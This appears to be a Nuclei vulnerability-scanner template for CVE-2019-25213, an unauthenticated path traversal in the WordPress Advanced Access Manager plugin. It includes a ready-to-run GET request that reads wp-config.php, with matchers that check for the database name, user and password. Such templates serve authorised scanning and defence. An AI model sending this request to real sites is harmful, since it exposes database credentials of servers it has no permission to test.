id: CVE-2019-25213

info:
  name: WordPress Advanced Access Manager - Path Traversal
  author: riteshs4hu
  severity: critical
  description: |
    The Advanced Access Manager plugin for WordPress is vulnerable to Unauthenticated Arbitrary File Read in versions up to, and including, 5.9.8.1 due to insufficient validation on the aam-media parameter. This allows unauthenticated attackers to read any file on the server, including sensitive files such as wp-config.php
  impact: |
    Unauthenticated attackers can read sensitive files like wp-config.php, leading to information disclosure and potential further exploitation.
  remediation: |
    Update to the latest version of the plugin that addresses this vulnerability.
  reference:
    - https://www.wordfence.com/threat-intel/vulnerabilities/id/55e0f0df-7be2-4e18-988c-2cc558768eff?source=cve
    - https://nvd.nist.gov/vuln/detail/CVE-2019-25213
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2019-25213
    epss-score: 0.3958
    epss-percentile: 0.97175
    cwe-id: CWE-264
  metadata:
    verified: true
    max-request: 1
    publicwww-query: "wp-content/plugins/advanced-access-manager"
  tags: cve,cve2019,wordpress,wp-plugin,wp,advanced_access_manager,lfi,vkev

http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=aam-media-load&aam-media=/wp-config.php"

    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - "contains_all(body, 'DB_NAME','DB_USER','DB_PASSWORD')"
        condition: and
# digest: 490a0046304402205d4e66055a9d8c9a332a2e41447ee389fd3df0dd5013b7bf93607a28034258ec022001105e83176309e4deb69e57e47c82e4899a31361da20736c27eca14e1dc1412:922c64590222798bb761d5b6d8e72950